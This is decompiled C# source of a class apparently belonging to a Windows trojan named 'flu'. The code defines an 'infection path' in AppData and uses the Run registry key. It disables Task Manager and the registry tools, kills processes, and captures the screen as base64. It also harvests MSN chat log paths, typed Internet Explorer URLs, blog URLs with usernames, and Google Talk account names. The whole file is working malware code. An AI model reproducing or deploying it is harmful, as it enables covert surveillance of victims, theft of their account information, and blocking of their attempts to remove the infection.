using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;

namespace flu;

internal class OS
{
	public const string RunKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";

	public const string SystemKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

	private const string DesktopKey = "Control Panel\\Desktop";

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	[DllImport("winmm.dll")]
	private static extern long mciSendString(string strCommand, StringBuilder strReturn, int iReturnLength, IntPtr hwndCallback);

	public static bool IsXP()
	{
		if (Environment.OSVersion.Version.ToString()[0].ToString() == "5")
		{
			return true;
		}
		return false;
	}

	public static string Version()
	{
		return Environment.OSVersion.Version.ToString()[0] + "." + Environment.OSVersion.Version.ToString()[2];
	}

	public static bool IsAdministrator()
	{
		WindowsIdentity current = WindowsIdentity.GetCurrent();
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(current);
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static string InfectionPath()
	{
		return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
	}

	public static void KillProcess(string name)
	{
		Process[] processes = Process.GetProcesses();
		Process[] array = processes;
		foreach (Process process in array)
		{
			if (process.ProcessName == name)
			{
				process.Kill();
			}
		}
	}

	public static void ChangeWallpaper(string path)
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
		registryKey.SetValue("Wallpaper", path);
		registryKey.Close();
		SystemParametersInfo(20, 0, "(None)", 3);
		SystemParametersInfo(20, 0, path, 3);
	}

	public static void SwitchTaskManager()
	{
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
		int num = (int)registryKey.GetValue("DisableTaskMgr");
		registryKey.SetValue("DisableTaskMgr", 1 - num);
		registryKey.SetValue("DisableRegistryTools", 1);
		registryKey.Close();
	}

	public static string CaptureScreen()
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		Rectangle bounds = Screen.get_AllScreens()[0].get_Bounds();
		Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)925707);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		val2.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size);
		MemoryStream memoryStream = new MemoryStream();
		((Image)val).Save((Stream)memoryStream, ImageFormat.get_Png());
		string result = Convert.ToBase64String(memoryStream.ToArray());
		memoryStream.Close();
		memoryStream.Dispose();
		return result;
	}

	public static void PlayAudio(string filename)
	{
		mciSendString("open \"" + filename + "\" type mpegvideo alias MediaFile", null, 0, IntPtr.Zero);
		mciSendString("play MediaFile", null, 0, IntPtr.Zero);
	}

	public static List<string> getMsnTalks()
	{
		List<string> list = new List<string>();
		list.Add("Msn talks:");
		string text = "SOFTWARE\\Microsoft\\MSNMessenger\\PerPassportSettings";
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text, writable: true);
		string[] subKeyNames = registryKey.GetSubKeyNames();
		string[] array = subKeyNames;
		foreach (string text2 in array)
		{
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(text + "\\" + text2, writable: true);
			if (registryKey2.GetValue("MessageLogPath") != null)
			{
				list.Add(registryKey2.GetValue("MessageLogPath")!.ToString());
			}
		}
		registryKey.Close();
		return list;
	}

	public static List<string> getMoviesMade()
	{
		List<string> list = new List<string>();
		list.Add("Created movies:");
		string name = "SOFTWARE\\Microsoft\\Windows Live\\Movie Maker\\Recent";
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
		string[] valueNames = registryKey.GetValueNames();
		string[] array = valueNames;
		foreach (string name2 in array)
		{
			list.Add(registryKey.GetValue(name2)!.ToString());
		}
		registryKey.Close();
		return list;
	}

	public static List<string> getInternetExplorerTypedUrls()
	{
		List<string> list = new List<string>();
		list.Add("Internet Explorer - Typed URLs:");
		string name = "SOFTWARE\\Microsoft\\Internet Explorer\\TypedURLs";
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
		string[] valueNames = registryKey.GetValueNames();
		string[] array = valueNames;
		foreach (string name2 in array)
		{
			list.Add(registryKey.GetValue(name2)!.ToString());
		}
		registryKey.Close();
		return list;
	}

	public static List<string> getBlogs()
	{
		List<string> list = new List<string>();
		list.Add("Blogs:");
		string text = "SOFTWARE\\Microsoft\\Windows Live\\Writer\\Weblogs";
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(text, writable: true);
		string[] subKeyNames = registryKey.GetSubKeyNames();
		string[] array = subKeyNames;
		foreach (string text2 in array)
		{
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(text + "\\" + text2, writable: true);
			if (registryKey2.GetValue("HomepageUrl") != null)
			{
				list.Add("Blog: " + registryKey2.GetValue("HomepageUrl"));
			}
			RegistryKey registryKey3 = Registry.CurrentUser.OpenSubKey(text + "\\" + text2 + "\\Credentials", writable: true);
			string[] valueNames = registryKey3.GetValueNames();
			string[] array2 = valueNames;
			foreach (string text3 in array2)
			{
				if (text3.Equals("Username"))
				{
					list.Add("User: " + registryKey3.GetValue(text3)!.ToString());
				}
			}
		}
		registryKey.Close();
		return list;
	}

	public static List<string> getGoogleAccount()
	{
		List<string> list = new List<string>();
		list.Add("Google accounts");
		string name = "Software\\Google\\Google Talk\\Accounts";
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, writable: true);
		string[] subKeyNames = registryKey.GetSubKeyNames();
		string[] array = subKeyNames;
		foreach (string item in array)
		{
			list.Add(item);
		}
		registryKey.Close();
		return list;
	}

	public static string getKeyValue(string rKey)
	{
		string result = string.Empty;
		RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		string[] valueNames = registryKey.GetValueNames();
		string[] array = valueNames;
		foreach (string text in array)
		{
			if (text.Equals(rKey))
			{
				try
				{
					result = registryKey.GetValue(text)!.ToString();
				}
				catch
				{
				}
				break;
			}
		}
		registryKey.Close();
		return result;
	}
}
